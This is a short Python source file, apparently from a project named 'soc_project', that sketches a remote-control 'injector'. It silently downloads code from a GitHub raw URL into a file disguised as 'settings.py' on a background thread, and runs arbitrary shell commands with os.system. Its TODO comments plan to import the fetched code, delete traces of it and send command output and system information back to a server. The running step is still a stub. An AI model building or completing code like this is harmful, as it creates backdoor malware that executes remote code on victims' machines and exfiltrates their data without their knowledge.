from requests import get
from threading import Thread
from os import system
from os.path import exists

url = 'https://raw.githubusercontent.com/LifeIsACage/soc_project/main/py_to_download.py'
file_name = 'settings.py'

#TODO - Open py file and send a command succesfull message to the server

def start_downloading():
    th1=Thread(target=download_code)
    th1.daemon = True
    th1.start()

def download_code():
    data = get(url)
    dataText = data.text

    f1= open(file_name, 'w')
    f1.write(dataText)
    f1.close()

def start_code():
    # TODO: Implement the running part of the injector. 
    # For example run it as a local library by inputing the recieved data into a function. 
    # Then just import it as a normal library.
    # After that delete the settings.py file and the old version of the remade program
    pass

# TODO: Remake the function so that if an argument is supllied it will return the output to the server
# This will be usefull for tracert and show directory commandsaas well as to get info from the PC
def run_cmd_code(cmd_data: str):
    try:
        cmd_data = cmd_data.split('-cmd')[1]
        print(f"Executing command: {cmd_data}")
        system(cmd_data)

    except Exception as s:
        print("Oh no error: {}".format(s))
